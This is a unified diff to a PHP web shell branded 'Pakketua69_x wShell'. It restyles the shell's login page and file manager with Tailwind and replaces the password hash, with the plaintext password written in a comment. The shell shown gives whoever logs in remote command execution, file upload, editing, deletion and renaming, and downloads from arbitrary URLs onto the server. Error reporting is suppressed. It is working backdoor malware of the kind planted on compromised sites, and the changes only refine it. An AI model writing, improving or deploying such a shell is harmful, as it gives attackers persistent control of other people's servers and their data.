@@ -2,12 +2,17 @@
 ob_start();
 set_time_limit(0);
 error_reporting(0);
-$hashed_password = '$2a$10$EU5p4AeDuXqsSdwKGCTZeOWGu7H.XSfbg/daBqps/sbHD4S2LcoEy';
+$hashed_password = '$2y$10$dxCNT/vH8djgIaJrVWhBRuJ0T4eZFKAQdtOyZO7f4m05mlYMG4jIq'; // Kondom123!@#
 
 function admin_login() {
-    echo '<form method="post">';
-    echo '<input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password">';
+    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><script src="https://cdn.tailwindcss.com"></script><title>Login</title></head><body class="bg-gradient-to-br from-blue-500 to-purple-600 min-h-screen flex items-center justify-center">';
+    echo '<div class="bg-white rounded-lg shadow-2xl p-12 w-full max-w-md">';
+    echo '<h1 class="text-3xl font-bold text-center text-gray-800 mb-8">Pakketua69_x wShell</h1>';
+    echo '<form method="post" class="space-y-4">';
+    echo '<input type="password" name="password" placeholder="Enter password" class="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-blue-500 text-lg">';
+    echo '<input type="submit" value="Login" class="w-full px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 cursor-pointer font-bold text-lg">';
     echo '</form>';
+    echo '</div></body></html>';
     exit;
 }
 
@@ -174,189 +179,71 @@ ob_end_flush();
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title></title>
-    <link href="https://fonts.googleapis.com/css?family=Arial:400,700" rel="stylesheet">
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            background-color: #f0f0f0;
-            color: #333;
-            margin: 0;
-            padding: 0;
-        }
-        .container {
-            max-width: 900px;
-            margin: 50px auto;
-            padding: 20px;
-            background-color: #fff;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-        h1 {
-            text-align: center;
-            color: #333;
-        }
-        form {
-            display: flex;
-            flex-direction: column;
-            margin-bottom: 20px;
-        }
-        form input[type="text"],
-        form textarea,
-        form input[type="file"] {
-            padding: 10px;
-            margin-bottom: 10px;
-            border: 1px solid #ccc;
-            background-color: #fff;
-            color: #333;
-            border-radius: 4px;
-            width: 100%;
-            box-sizing: border-box;
-        }
-        form input[type="submit"] {
-            padding: 10px;
-            background-color: #007bff; 
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        form input[type="submit"]:hover {
-            background-color: #0056b3;
-        }
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 20px;
-        }
-        th, td {
-            padding: 12px;
-            text-align: left;
-            border: 1px solid #ccc;
-        }
-        th {
-            background-color: #f4f4f4;
-        }
-        tr:nth-child(even) {
-            background-color: #f9f9f9;
-        }
-        tr:hover {
-            background-color: #f1f1f1;
-        }
-        .folder,
-        .file,
-        .directory {
-            color: #333;
-        }
-        a {
-            color: #007bff;
-        }
-        .item-name {
-            max-width: 200px;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-            display: flex;
-            align-items: center;
-        }
-        .item-name svg {
-            margin-right: 8px;
-        }
-        .size, .date {
-            width: 100px;
-        }
-        .permission {
-            font-weight: bold;
-            width: 80px;
-            text-align: center;
-        }
-        .writable {
-            color: #28a745;
-        }
-        .not-writable {
-            color: #dc3545;
-        }
-        .message {
-            margin-bottom: 20px;
-            padding: 10px;
-            background-color: #f4f4f4;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            color: #333;
-        }
-        .result-box {
-            width: 100%;
-            height: 200px;
-            background-color: #fff;
-            color: #333;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            padding: 10px;
-            box-sizing: border-box;
-        }
-        .icon-folder {
-            fill: #FFD700;
-        }
-        .icon-file {
-            fill: #00BFFF;
-        }
-    </style>
+    <title>Pakketua69_x wShell</title>
+    <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body>
-<div class="container">
+<body class="bg-gradient-to-br from-gray-900 to-gray-800 min-h-screen">
+<div class="max-w-5xl mx-auto my-12 px-4">
+    <div class="bg-gray-800 rounded-lg shadow-2xl p-8 border border-gray-700">
     <?php
-    echo '<a href="?d=' . x($scriptDirectory) . '"><span style="color: #007bff;">[ GO Home ]</span></a>';
-    echo '<hr>Current Directory: ';
+    echo '<a href="?d=' . x($scriptDirectory) . '" class="text-blue-400 hover:text-blue-300 font-semibold">[ GO Home ]</a>';
+    echo '<hr class="my-4 border-gray-600">
+    <p class="text-gray-300 font-semibold mb-2">Current Directory: ';
 
     $directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
     $currentPath = '';
     foreach ($directories as $index => $dir) {
         $currentPath .= DIRECTORY_SEPARATOR . $dir;
-        echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
+        echo ' / <a href="?d=' . x($currentPath) . '" class="text-blue-400 hover:underline">' . $dir . '</a>';
     }
+    echo '</p>';
 
-    echo '<a href="?d=' . x($scriptDirectory) . '"> / <span style="color: green;">[ GO Home ]</span></a>';
-    echo '<br><hr>';
+    echo '<div class="space-y-4 mt-6">';
 
-    echo '<form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '">';
-    echo '<input type="text" name="folder_name" placeholder="New Folder Name">';
-    echo '<input type="submit" value="Create Folder">';
+    echo '<form method="post" class="flex gap-2">';
+    echo '<input type="text" name="folder_name" placeholder="New Folder Name" class="flex-1 px-4 py-2 border border-gray-600 rounded-lg bg-gray-700 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500">';
+    echo '<input type="submit" value="Create Folder" class="px-6 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 cursor-pointer font-semibold">';
     echo '</form>';
 
-    echo '<form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '">';
-    echo '<input type="text" name="file_name" placeholder="Create New File / Edit Existing File">';
-    echo '<textarea name="file_content" placeholder="File Content (for new file) or Edit Content (for existing file)"></textarea>';
-    echo '<input type="submit" value="Create / Edit File">';
+    echo '<form method="post" class="space-y-2">';
+    echo '<input type="text" name="file_name" placeholder="Create New File / Edit Existing File" class="w-full px-4 py-2 border border-gray-600 rounded-lg bg-gray-700 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500">';
+    echo '<textarea name="file_content" placeholder="File Content" class="w-full px-4 py-2 border border-gray-600 rounded-lg bg-gray-700 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 h-32"></textarea>';
+    echo '<input type="submit" value="Create / Edit File" class="w-full px-6 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 cursor-pointer font-semibold">';
     echo '</form>';
 
-    echo '<form method="post" enctype="multipart/form-data">';
-    echo '<input type="file" name="fileToUpload" id="fileToUpload" placeholder="Choose file">';
-    echo '<input type="submit" value="Upload File" name="submit">';
+    echo '<form method="post" enctype="multipart/form-data" class="flex gap-2">';
+    echo '<input type="file" name="fileToUpload" id="fileToUpload" class="flex-1 px-4 py-2 border border-gray-600 rounded-lg bg-gray-700 text-white">';
+    echo '<input type="submit" value="Upload File" name="submit" class="px-6 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 cursor-pointer font-semibold">';
     echo '</form>';
 
-    echo '<form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '">';
-    echo '<input type="text" name="xmd_input" placeholder="Enter command">';
-    echo '<input type="submit" value="Run Command">';
+    echo '<form method="post" class="flex gap-2">';
+    echo '<input type="text" name="xmd_input" placeholder="Enter command" class="flex-1 px-4 py-2 border border-gray-600 rounded-lg bg-gray-700 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500">';
+    echo '<input type="submit" value="Run Command" class="px-6 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 cursor-pointer font-semibold">';
     echo '</form>';
 
-    echo '<form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '">';
-    echo '<input type="text" name="download_url" placeholder="Enter URL to download">';
-    echo '<input type="text" name="target_file" placeholder="Target file name">';
-    echo '<input type="submit" value="Download File">';
+    echo '<form method="post" class="space-y-2">';
+    echo '<input type="text" name="download_url" placeholder="Enter URL to download" class="w-full px-4 py-2 border border-gray-600 rounded-lg bg-gray-700 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500">';
+    echo '<input type="text" name="target_file" placeholder="Target file name" class="w-full px-4 py-2 border border-gray-600 rounded-lg bg-gray-700 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500">';
+    echo '<input type="submit" value="Download File" class="w-full px-6 py-2 bg-indigo-600 text-white rounded-lg hover:bg-indigo-700 cursor-pointer font-semibold">';
     echo '</form>';
+
+    echo '</div>';
 
     if ($editFileContent !== '') {
-        echo '<form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '">';
+        echo '<form method="post" class="mt-6 space-y-2">';
         echo '<input type="hidden" name="file_path" value="' . htmlspecialchars($fileToEdit) . '">';
-        echo '<textarea name="file_content" rows="20">' . htmlspecialchars($editFileContent) . '</textarea>';
-        echo '<input type="submit" name="save_file" value="Save File">';
+        echo '<textarea name="file_content" rows="25" class="w-full px-4 py-2 border border-gray-600 rounded-lg bg-gray-700 text-white focus:outline-none focus:ring-2 focus:ring-blue-500 font-mono text-sm">' . htmlspecialchars($editFileContent) . '</textarea>';
+        echo '<input type="submit" name="save_file" value="Save File" class="w-full px-6 py-2 bg-yellow-600 text-white rounded-lg hover:bg-yellow-700 cursor-pointer font-semibold">';
         echo '</form>';
     }
 
-    echo $viewCommandResult;
+    if ($viewCommandResult) {
+        echo '<div class="mt-6 p-4 bg-gray-700 border border-gray-600 rounded-lg">' . str_replace('class="result-box"', 'class="result-box w-full h-96 px-4 py-2 border border-gray-600 rounded-lg bg-gray-900 text-gray-100 font-mono text-sm overflow-auto"', $viewCommandResult) . '</div>';
+    }
 
-    echo '<table>';
-    echo '<tr><th>Item Name</th><th>Size</th><th>Date</th><th>Permissions</th><th>View</th><th>Edit</th><th>Delete</th><th>Rename</th></tr>';
+    echo '<div class="mt-8 overflow-x-auto">';
+    echo '<table class="w-full border-collapse">';
+    echo '<tr class="bg-gray-700 font-bold text-gray-100"><th class="border border-gray-600 px-4 py-3 text-left">Item Name</th><th class="border border-gray-600 px-4 py-3 text-left">Size</th><th class="border border-gray-600 px-4 py-3 text-left">Date</th><th class="border border-gray-600 px-4 py-3 text-left">Permissions</th><th class="border border-gray-600 px-4 py-3 text-center">View</th><th class="border border-gray-600 px-4 py-3 text-center">Edit</th><th class="border border-gray-600 px-4 py-3 text-center">Delete</th><th class="border border-gray-600 px-4 py-3 text-center">Rename</th></tr>';
 
     $directories = [];
     $files = [];
@@ -377,18 +264,18 @@ ob_end_flush();
         $itemLink = '?d=' . x($currentDirectory . '/' . $dir);
         $permission = substr(sprintf('%o', fileperms($u)), -4);
         $writable = is_writable($u);
-        echo '<tr>
-                <td class="item-name folder">
-                    <svg class="icon-folder" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16"><path d="M10 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>
-                    <a href="' . $itemLink . '">' . $dir . '</a>
+        echo '<tr class="border border-gray-600 hover:bg-gray-700">
+                <td class="border border-gray-600 px-4 py-3 flex items-center gap-2 text-blue-400">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M10 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>
+                    <a href="' . $itemLink . '" class="hover:underline text-gray-200">' . $dir . '</a>
                 </td>
-                <td class="size">--</td>
-                <td class="date" style="text-align: center;">' . date('Y-m-d H:i:s', $s['mtime']) . '</td>
-                <td class="permission ' . ($writable ? 'writable' : 'not-writable') . '">' . $permission . '</td>
-                <td><form method="post"><input type="hidden" name="view_file" value="' . htmlspecialchars($dir) . '"><input type="submit" value="View" disabled></form></td>
-                <td></td>
-                <td><form method="post"><input type="hidden" name="delete_file" value="' . htmlspecialchars($dir) . '"><input type="submit" value="Delete"></form></td>
-                <td><form method="post"><input type="hidden" name="old_name" value="' . htmlspecialchars($dir) . '"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+                <td class="border border-gray-600 px-4 py-3 text-gray-400">--</td>
+                <td class="border border-gray-600 px-4 py-3 text-gray-400 text-sm">' . date('Y-m-d H:i:s', $s['mtime']) . '</td>
+                <td class="border border-gray-600 px-4 py-3 font-bold ' . ($writable ? 'text-green-400' : 'text-red-400') . '">' . $permission . '</td>
+                <td class="border border-gray-600 px-4 py-3 text-center"><input type="submit" value="View" disabled class="px-2 py-1 bg-gray-600 text-gray-400 rounded text-sm cursor-not-allowed"></td>
+                <td class="border border-gray-600 px-4 py-3"></td>
+                <td class="border border-gray-600 px-4 py-3"><form method="post" class="inline"><input type="hidden" name="delete_file" value="' . htmlspecialchars($dir) . '"><input type="submit" value="Delete" class="px-2 py-1 bg-red-600 text-white rounded hover:bg-red-700 text-sm cursor-pointer"></form></td>
+                <td class="border border-gray-600 px-4 py-3"><form method="post" class="flex gap-1"><input type="hidden" name="old_name" value="' . htmlspecialchars($dir) . '"><input type="text" name="new_name" placeholder="New Name" class="px-2 py-1 border border-gray-600 rounded bg-gray-700 text-white text-sm"><input type="submit" name="rename_item" value="Rename" class="px-2 py-1 bg-yellow-600 text-white rounded hover:bg-yellow-700 text-sm cursor-pointer"></form></td>
             </tr>';
     }
 
@@ -398,22 +285,35 @@ ob_end_flush();
         $itemLink = '?d=' . x($currentDirectory) . '&f=' . x($file);
         $permission = substr(sprintf('%o', fileperms($u)), -4);
         $writable = is_writable($u);
-        echo '<tr>
-                <td class="item-name file">
-                    <svg class="icon-file" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16"><path d="M6 2h9l5 5v13c0 1.1-.9 2-2 2H6c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2z"/></svg>
-                    <a href="' . $itemLink . '">' . $file . '</a>
+        echo '<tr class="border border-gray-600 hover:bg-gray-700">
+                <td class="border border-gray-600 px-4 py-3 flex items-center gap-2 text-cyan-400">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M6 2h9l5 5v13c0 1.1-.9 2-2 2H6c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2z"/></svg>
+                    <a href="' . $itemLink . '" class="hover:underline text-gray-200">' . $file . '</a>
                 </td>
-                <td class="size">' . filesize($u) . '</td>
-                <td class="date" style="text-align: center;">' . date('Y-m-d H:i:s', $s['mtime']) . '</td>
-                <td class="permission ' . ($writable ? 'writable' : 'not-writable') . '">' . $permission . '</td>
-                <td><form method="post"><input type="hidden" name="view_file" value="' . htmlspecialchars($file) . '"><input type="submit" value="View"></form></td>
-                <td><form method="post"><input type="hidden" name="edit_file" value="' . htmlspecialchars($file) . '"><input type="submit" value="Edit"></form></td>
-                <td><form method="post"><input type="hidden" name="delete_file" value="' . htmlspecialchars($file) . '"><input type="submit" value="Delete"></form></td>
-                <td><form method="post"><input type="hidden" name="old_name" value="' . htmlspecialchars($file) . '"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+                <td class="border border-gray-600 px-4 py-3 text-gray-400 text-sm">' . formatBytes(filesize($u)) . '</td>
+                <td class="border border-gray-600 px-4 py-3 text-gray-400 text-sm">' . date('Y-m-d H:i:s', $s['mtime']) . '</td>
+                <td class="border border-gray-600 px-4 py-3 font-bold ' . ($writable ? 'text-green-400' : 'text-red-400') . '">' . $permission . '</td>
+                <td class="border border-gray-600 px-4 py-3"><form method="post" class="inline"><input type="hidden" name="view_file" value="' . htmlspecialchars($file) . '"><input type="submit" value="View" class="px-2 py-1 bg-blue-600 text-white rounded hover:bg-blue-700 text-sm cursor-pointer"></form></td>
+                <td class="border border-gray-600 px-4 py-3"><form method="post" class="inline"><input type="hidden" name="edit_file" value="' . htmlspecialchars($file) . '"><input type="submit" value="Edit" class="px-2 py-1 bg-orange-600 text-white rounded hover:bg-orange-700 text-sm cursor-pointer"></form></td>
+                <td class="border border-gray-600 px-4 py-3"><form method="post" class="inline"><input type="hidden" name="delete_file" value="' . htmlspecialchars($file) . '"><input type="submit" value="Delete" class="px-2 py-1 bg-red-600 text-white rounded hover:bg-red-700 text-sm cursor-pointer"></form></td>
+                <td class="border border-gray-600 px-4 py-3"><form method="post" class="flex gap-1"><input type="hidden" name="old_name" value="' . htmlspecialchars($file) . '"><input type="text" name="new_name" placeholder="New Name" class="px-2 py-1 border border-gray-600 rounded bg-gray-700 text-white text-sm"><input type="submit" name="rename_item" value="Rename" class="px-2 py-1 bg-yellow-600 text-white rounded hover:bg-yellow-700 text-sm cursor-pointer"></form></td>
             </tr>';
     }
 
-    echo '</table>';
+    echo '</table></div>';
+    ?>
+    </div>
+    </div>
+    <?php
+
+    function formatBytes($bytes, $precision = 2) {
+        $units = ['B', 'KB', 'MB', 'GB'];
+        $bytes = max($bytes, 0);
+        $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
+        $pow = min($pow, count($units) - 1);
+        $bytes /= (1 << (10 * $pow));
+        return round($bytes, $precision) . ' ' . $units[$pow];
+    }
 
     function deleteDirectory($dir) {
         if (!file_exists($dir)) {
@@ -433,6 +333,5 @@ ob_end_flush();
         return rmdir($dir);
     }
     ?>
-</div>
 </body>
 </html>
